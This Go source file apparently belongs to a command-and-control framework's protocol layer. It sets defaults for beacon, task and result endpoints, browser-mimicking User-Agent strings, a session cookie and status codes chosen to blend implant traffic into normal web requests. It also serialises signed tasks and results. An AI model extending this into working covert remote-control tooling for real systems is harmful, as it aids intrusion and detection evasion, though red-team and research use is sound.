package protocol

import (
	"bytes"
	"runtime"
	"encoding/json"
)

func (p Profile) Resolved() Profile {
	if runtime.GOOS == "linux" && p.LinuxUserAgent != "" {
		p.UserAgent = p.LinuxUserAgent
	}
	if p.UserAgent == "" {
		if runtime.GOOS == "linux" {
			p.UserAgent = "Mozilla/5.0 (X11; Linux x86_64)"
		} else {
			p.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
		}
	}
	if p.BeaconPath == "" {
		p.BeaconPath = "/beacon"
	}
	if p.TasksPath == "" {
		p.TasksPath = "/tasks"
	}
	if p.ResultsPath == "" {
		p.ResultsPath = "/results"
	}
	if p.ExtraHeaders == nil {
		p.ExtraHeaders = map[string]string{}
	}
	if p.RequestHeaders == nil {
		p.RequestHeaders = map[string]string{}
	}

	if p.CookieName == "" {
		p.CookieName = "sid"
	}

	if p.Status == nil {
		p.Status = &ProfileStatus{}
	}
	if p.Status.Beacon == 0 {
		p.Status.Beacon = 200
	}
	if p.Status.Tasks == 0 {
		p.Status.Tasks = 200
	}
	if p.Status.Results == 0 {
		p.Status.Results = 204
	}
	if p.Status.Error == 0 {
		p.Status.Error = 404
	}

	return p
}

func (t Task) Unsigned() ([]byte, error) {
	args := []string{}
	args = append(args, t.Args...)
	payload := map[string]interface{}{
		"args":    args,
		"id":      t.ID,
		"timeout": t.Timeout,
		"verb":    t.Verb,
	}
	return canonicalJSON(payload)
}

func (r Result) Signable() ([]byte, error) {
	payload := map[string]interface{}{
		"error":     r.Error,
		"exit_code": r.ExitCode,
		"id":        r.ID,
		"output":    r.Output,
	}
	return canonicalJSON(payload)
}

func canonicalJSON(v interface{}) ([]byte, error) {
	var buf bytes.Buffer
	enc := json.NewEncoder(&buf)
	enc.SetEscapeHTML(false)
	if err := enc.Encode(v); err != nil {
		return nil, err
	}
	return bytes.TrimRight(buf.Bytes(), "\n"), nil
}